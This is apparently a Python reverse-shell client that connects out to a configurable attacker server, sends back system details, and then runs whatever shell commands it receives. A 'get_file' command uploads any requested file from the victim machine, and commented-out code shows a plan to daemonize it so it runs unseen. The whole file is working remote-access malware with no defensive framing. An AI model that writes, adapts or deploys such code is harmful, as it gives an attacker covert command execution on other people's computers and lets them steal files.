import socket
import subprocess
import os
import platform
import time


def send_file(filename, filesize, BUFFER_SIZE, s):
    # start sending the file
    with open(filename, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in
            # busy networks
            s.sendall(bytes_read)


def run():

    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        print(command)
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        elif command[:2] == 'cd':
            if command[3] == '~':
                os.chdir(os.environ['HOME'] + (command[4:] if len(command)>3 else None))
            else:
                os.chdir(command[3:])
            s.send(os.getcwd().encode())
        elif command[:8] == "get_file":
            filename = command[9:]
            try:
                filesize = os.path.getsize(filename)
            except:
                s.send("Path doesn't exist!".encode())
                continue
            s.send(str(filesize).encode())
            if s.recv(BUFFER_SIZE).decode() == "ok":
                send_file(filename, filesize, BUFFER_SIZE, s)
        else:
            # execute the command and retrieve the results
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
            output, err = p.communicate()
            # send the results back to the server
            s.send(output + (err if err else "".encode()) + "\n".encode() + os.getcwd().encode())
    # close client connection
    s.close()


if __name__ == '__main__':
    SERVER_HOST = "HOST"
    SERVER_PORT = "PORT"
    BUFFER_SIZE = 10240
    SEPARATOR = "<SEPARATOR>"

    # create the socket object
    s = socket.socket()
    # connect to the server
    s.connect((SERVER_HOST, SERVER_PORT))
    s.send(platform.platform().encode() + "\n".encode() + os.getcwd().encode())
    # with Daemonizer() as (is_setup, daemonizer):
    #     if is_setup:
    #         # This code is run before daemonization.
    #         pass
    #
    #     # We need to explicitly pass resources to the daemon; other variables
    #     # may not be correct
    #     is_parent = daemonizer("pid.txt")
    #
    #     if is_parent:
    #         # Run code in the parent after daemonization
    #         print("woshi fu jin cheng")
    #
    # # We are now daemonized, and the parent just exited.
    run()


    # time.sleep(10)